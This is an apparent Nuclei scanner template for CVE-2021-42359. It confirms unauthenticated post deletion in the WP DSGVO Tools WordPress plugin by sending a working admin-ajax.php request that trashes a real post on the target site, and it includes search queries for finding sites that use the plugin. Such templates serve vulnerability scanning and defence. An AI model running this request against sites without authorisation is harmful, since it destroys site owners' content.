flow: http(1) && http(2) && http(3)
http:
- attack: clusterbomb
  extractors:
  - internal: true
    json:
    - .[0].id
    name: post_id
    type: json
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    - contains_all(body, "[{\"id", "name\":")
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/{{route}}'
  payloads:
    route:
    - wp-json/wp/v2/posts
    - ?rest_route=/wp/v2/posts
  stop-at-first-match: true
- matchers:
  - dsl:
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=admin-dismiss-unsubscribe&id={{post_id}}

    '
- attack: clusterbomb
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    - '!contains(body, "\"id\":{{post_id}}")'
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/{{route}}'
  payloads:
    route:
    - wp-json/wp/v2/posts
    - ?rest_route=/wp/v2/posts
  stop-at-first-match: true
id: CVE-2021-42359
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:legalweb:wp_dsgvo_tools:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-42359
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cwe-id: CWE-862,CWE-284
    epss-percentile: 0.95433
    epss-score: 0.20875
  description: "WP DSGVO Tools (GDPR) <= 3.1.23 had an AJAX action, \u2018admin-dismiss-unsubscribe\u2018\
    , which lacked a capability check and a nonce check and was available to unauthenticated\
    \ users, and did not check the post type when deleting unsubscription requests.\
    \ As such, it was possible for an attacker to permanently delete an arbitrary\
    \ post or page on the site by sending an AJAX request with the \u201Caction\u201D\
    \ parameter set to \u201Cadmin-dismiss-unsubscribe\u201D and the \u201Cid\u201D\
    \ parameter set to the post to be deleted. Sending such a request would move the\
    \ post to the trash, and repeating the request would permanently delete the post\
    \ in question.\n"
  impact: 'Unauthenticated attackers can permanently delete arbitrary WordPress posts
    and pages by exploiting the unprotected admin-dismiss-unsubscribe AJAX action.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/shapepress-dsgvo/"
    framework: wordpress
    max-request: 5
    product: wp_dsgvo_tools
    publicwww-query: /wp-content/plugins/shapepress-dsgvo/
    vendor: legalweb
    verified: true
  name: WP DSGVO Tools (GDPR) <= 3.1.23 - Unauthenticated Arbitrary Post Deletion
  reference:
  - https://www.wordfence.com/blog/2021/11/vulnerability-in-wp-dsgvo-tools-gdpr-plugin-allows-unauthenticated-page-deletion/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-42359
  remediation: 'Upgrade to WP DSGVO Tools version 3.1.24 or later.

    '
  severity: high
  tags: cve,cve2021,wp,wordpress,wp-plugin,dsgvo,intrusive,vkev,vuln
